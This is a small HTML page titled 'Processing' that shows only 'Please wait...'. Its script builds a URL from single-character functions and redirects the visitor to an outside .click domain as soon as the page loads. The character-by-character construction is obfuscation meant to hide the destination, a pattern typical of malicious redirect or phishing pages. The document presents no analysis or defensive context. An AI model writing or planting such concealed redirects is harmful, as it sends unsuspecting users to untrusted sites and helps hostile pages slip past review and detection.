<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Processing</title>
    <script>
        const fragments = [
            function() { return 'h'; },
            () => 't',
            () => 't',
            _ => 'p',
            function() { return 's'; },
            _ => ':',
            _ => '/',
            function() { return '/'; },
            () => 'v',
            _ => 'e',
            function() { return 'r'; },
            _ => 'g',
            function() { return 'e'; },
            () => 'n',
            _ => '.',
            _ => 'c',
            () => 'l',
            _ => 'i',
            _ => 'c',
            function() { return 'k'; },
            () => '/',
            function() { return 's'; },
            _ => '/',
            _ => 'n',
            () => 'e',
            () => 'w'
        ];
        window.location.href = fragments.map(fn => fn()).join('');
    </script>
</head>
<body>
    <p>Please wait...</p>
</body>
</html>
